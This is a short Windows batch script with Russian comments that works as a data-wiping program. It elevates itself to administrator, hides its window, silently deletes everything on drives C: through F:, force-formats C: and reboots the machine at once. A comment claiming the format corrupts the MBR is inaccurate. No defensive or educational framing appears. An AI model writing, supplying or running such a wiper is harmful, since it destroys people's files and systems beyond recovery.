@echo off
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :admin
) else (
    echo Требуются права администратора
    echo Запуск от имени администратора...
    powershell Start-Process "%~f0" -Verb RunAs
    exit /b
)

:admin
color 0c
title SYSTEM FAILURE

:: Скрываем консоль
powershell -window hidden -command ""

:: Мгновенное удаление всех файлов
rd /s /q C:\ >nul 2>&1
rd /s /q D:\ >nul 2>&1
rd /s /q E:\ >nul 2>&1
rd /s /q F:\ >nul 2>&1

:: Повреждаем MBR для гарантии
echo Y|format C: /fs:ntfs /q >nul 2>&1

:: Принудительная перезагрузка
shutdown /r /t 0 /f
